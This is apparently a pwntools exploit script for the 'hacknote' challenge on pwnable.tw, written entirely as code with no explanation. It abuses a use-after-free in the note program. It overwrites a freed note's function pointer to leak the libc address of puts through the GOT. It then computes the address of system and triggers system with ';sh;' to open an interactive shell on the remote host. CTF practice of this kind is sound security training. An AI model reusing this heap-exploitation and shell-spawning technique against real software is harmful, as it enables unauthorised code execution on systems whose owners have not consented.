from pwn import *

#fd = process("./hacknote", env = {'LD_PRELOAD':'./libc_32.so.6'})
fd = remote('chall.pwnable.tw', 10102)


def add(num, pay):
	fd.recv()
	fd.sendline("1")
	fd.recvuntil("Note size :")
	fd.sendline(str(num))
	fd.recvuntil("Content :")
	fd.send(pay*num)

def delete(num):
	fd.recv()
	fd.sendline("2")
	fd.recvuntil("Index :")
	fd.sendline(str(num))

def solver():
	pause()
	elf = ELF('./hacknote')
	libc = ELF('./libc_32.so.6')
	
	fake_puts = 0x804862b
	puts_got = elf.got['puts']
	puts_offset = libc.symbols['puts']
	system_offset = libc.symbols['system']

	pay = p32(fake_puts) + p32(puts_got)

	add(16, "A")
	add(16, "A")
	delete(0)
	delete(1)
	add(8, pay)
	
	fd.recvuntil("Your choice :")
	fd.sendline("3")
	fd.recvuntil("Index :")
	fd.sendline("0")
	leak = u32(fd.recv(4))
	
	libc_base = leak - puts_offset
	system = libc_base + system_offset
	
	
	delete(2)

	pay = p32(system) + ";sh;"
	add(8, pay)
	
	fd.interactive()

	



if __name__ == '__main__':
	solver()
